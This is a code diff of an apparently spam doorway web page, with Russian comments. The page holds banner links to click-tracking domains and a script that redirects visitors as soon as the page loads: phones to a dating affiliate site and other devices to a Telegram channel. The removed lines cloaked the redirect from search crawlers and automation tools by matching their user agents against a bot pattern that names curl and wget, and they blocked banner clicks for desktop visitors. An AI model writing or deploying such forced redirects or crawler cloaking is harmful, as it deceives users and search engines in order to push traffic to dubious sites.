@@ -101,7 +101,6 @@ header h1 {
     >
   </a>
 
-
   <a
     href="https://simal.top/click?o=3&a=6549&sub_id1=69x"
     class="banner"
@@ -111,7 +110,6 @@ header h1 {
       alt="Banner"
     >
   </a>
-
 
   <a
     href="https://stroki.top/click?o=2&a=6549&sub_id1=69x"
@@ -123,7 +121,6 @@ header h1 {
     >
   </a>
 
-
   <a
     href="https://stroki.top/click?o=2&a=6549&sub_id1=69x"
     class="banner"
@@ -133,7 +130,6 @@ header h1 {
       alt="Banner"
     >
   </a>
-
 
   <a
     href="https://simal.top/click?o=3&a=6549&sub_id1=69x"
@@ -150,177 +146,86 @@ header h1 {
 
 <script>
 
-/* =========================================
-   КУДА ОТПРАВЛЯЕМ МОБИЛЬНЫЕ
-========================================= */
+/* ==================================================
+   НАСТРОЙКИ
+================================================== */
 
-const mobileRedirectUrl = "https://grzvkg.datingcorrner.com/?utm_source=da57dc555e50572d&ban=other&j1=1&s1=212364&s2=2185091";
+const mobileUrl =
+  "https://grzvkg.datingcorrner.com/?utm_source=da57dc555e50572d&ban=other&j1=1&s1=212364&s2=2185091";
+
+const desktopUrl =
+  "https://t.me/pys365";
+
+const redirectDelay = 1300;
 
 
-/* =========================================
-   ОПРЕДЕЛЕНИЕ ОС
-========================================= */
+/* ==================================================
+   ANDROID / IOS
+================================================== */
 
-function getMobileOS() {
+function isAndroidOrIOS() {
 
   const ua = navigator.userAgent || "";
+  const platform = navigator.platform || "";
 
-
-  /* ANDROID PHONE */
-
-  if (
-    /Android/i.test(ua) &&
-    /Mobile/i.test(ua)
-  ) {
-    return "android";
+  /* Android */
+  if (/Android/i.test(ua)) {
+    return true;
   }
 
-
-  /* IPHONE / IPOD */
-
-  if (/iPhone|iPod/i.test(ua)) {
-    return "ios";
+  /* iPhone / iPad / iPod */
+  if (/iPhone|iPad|iPod/i.test(ua)) {
+    return true;
   }
-
 
   /*
-    Всё остальное:
-
-    Windows
-    macOS
-    Linux
-    ChromeOS
-    Android tablet
-    iPad
-    Unknown
-    странный/пустой UA
-
-    → UNKNOWN
+    Современный iPadOS иногда определяется
+    как Macintosh.
   */
+  const isModernIPad =
+    platform === "MacIntel" &&
+    navigator.maxTouchPoints > 1;
 
-  return "unknown";
-}
-
-
-/* =========================================
-   ПРОСТАЯ ПРОВЕРКА БОТОВ
-========================================= */
-
-function isObviousBot() {
-
-  const ua = navigator.userAgent || "";
-
-  const botPattern =
-    /googlebot|bingbot|yandexbot|baiduspider|duckduckbot|slurp|facebookexternalhit|twitterbot|linkedinbot|semrush|ahrefs|mj12bot|dotbot|headlesschrome|phantomjs|selenium|puppeteer|playwright|python-requests|curl\/|wget|scrapy/i;
-
-
-  /* BOT ПО USER AGENT */
-
-  if (botPattern.test(ua)) {
+  if (isModernIPad) {
     return true;
   }
-
-
-  /* AUTOMATION / WEBDRIVER */
-
-  if (navigator.webdriver === true) {
-    return true;
-  }
-
 
   return false;
 }
 
 
-/* =========================================
-   ЗАПУСК
-========================================= */
+/* ==================================================
+   REDIRECT
+================================================== */
 
 document.addEventListener("DOMContentLoaded", function () {
 
-  const os = getMobileOS();
-  const bot = isObviousBot();
+  const mobile = isAndroidOrIOS();
 
-
-  console.log("===== DEVICE CHECK =====");
-
-  console.log("OS:", os);
-  console.log("BOT:", bot);
+  console.log("===== KUNI DEVICE CHECK =====");
   console.log("UA:", navigator.userAgent);
+  console.log("PLATFORM:", navigator.platform);
+  console.log("TOUCH:", navigator.maxTouchPoints);
+  console.log("ANDROID / IOS:", mobile);
+  console.log("=============================");
 
-  console.log("========================");
+  setTimeout(function () {
 
+    if (mobile) {
 
-  /* =====================================
-     РАЗРЕШАЕМ ТОЛЬКО:
+      console.log("[REDIRECT] Android/iOS -> Mobile URL");
 
-     ANDROID PHONE
-     IPHONE / IPOD
+      window.location.replace(mobileUrl);
 
-     И ТОЛЬКО ЕСЛИ НЕ BOT
-  ===================================== */
+    } else {
 
-  const redirectAllowed =
-    (os === "android" || os === "ios") &&
-    bot === false;
+      console.log("[REDIRECT] Other device -> Telegram");
 
+      window.location.replace(desktopUrl);
 
-  if (redirectAllowed) {
+    }
 
-    console.log("[ALLOW] Mobile redirect");
-
-    setTimeout(function () {
-
-      window.location.replace(
-        mobileRedirectUrl
-      );
-
-    }, 1300);
-
-  } else {
-
-    /*
-      UNKNOWN
-      PC
-      TABLET
-      BOT
-
-      → НИКУДА НЕ ПЕРЕХОДИМ
-    */
-
-    console.log(
-      "[BLOCK]",
-      "No redirect",
-      {
-        os: os,
-        bot: bot
-      }
-    );
-
-
-    /* Блокируем переходы по баннерам */
-
-    document
-      .querySelectorAll(".banner")
-      .forEach(function (banner) {
-
-        banner.addEventListener(
-          "click",
-          function (event) {
-
-            event.preventDefault();
-            event.stopPropagation();
-
-            console.log(
-              "[BLOCK] Banner click ignored"
-            );
-
-          }
-        );
-
-      });
-
-  }
+  }, redirectDelay);
 
 });
 
